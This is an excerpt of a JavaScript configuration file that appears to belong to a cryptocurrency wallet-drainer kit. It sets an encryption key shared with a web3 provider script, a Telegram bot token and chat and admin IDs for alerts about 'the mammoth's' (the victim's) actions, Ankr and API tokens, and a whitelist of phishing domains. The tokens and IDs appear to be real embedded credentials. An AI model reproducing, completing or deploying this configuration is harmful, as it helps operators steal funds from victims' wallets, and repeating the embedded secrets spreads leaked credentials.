...
const MS_Encryption_Key = 40; // Please specify any number to be used for encryption (not recommended to leave default!)
// The same number should also be specified in the web3-provider.js file - if they differ, nothing will work correctly

const MS_Telegram_Token = "8355548686:AAHlXk3UgOlCUgV3QIc87cwsVuEhQqFeAIU"; // Enter your bot token from @BotFather here (go there, create a bot, and get this token)
const MS_Telegram_Chat_ID = ["6809950741"]; // Enter the chat ID(s) here where notifications about the mammoth's actions need to be sent (if the ID starts with a minus, write it as is)
// To specify multiple chats, fill it out like this: MS_Telegram_Chat_ID = ["CHANNEL_ID", "ANOTHER_CHANNEL_ID", "ONE_MORE_CHANNEL_ID"]
const MS_Telegram_Admin_IDs = [ 6809950741 ]; // Enter your Telegram ID here so that it only accepts commands from you
...
const MS_Ankr_Token = "072a650978c269390c7b349b89c6c611eeab99627964abd91ac58a5635686208"; // Ankr Premium token, leave it blank ("") to use Ankr Free.
...
const MS_API_Token = "072a650978c269390c7b349b89c6c611eeab99627964abd91ac58a5635686208"; // Access key for accessing API requests (BE SURE TO CHANGE THIS VALUE!).
...
const MS_Domains_Whilelist = [ "Lenix Protocol.vercel.app", "another.example.com" ]; // Whitelist of domains, fill in as per the example.
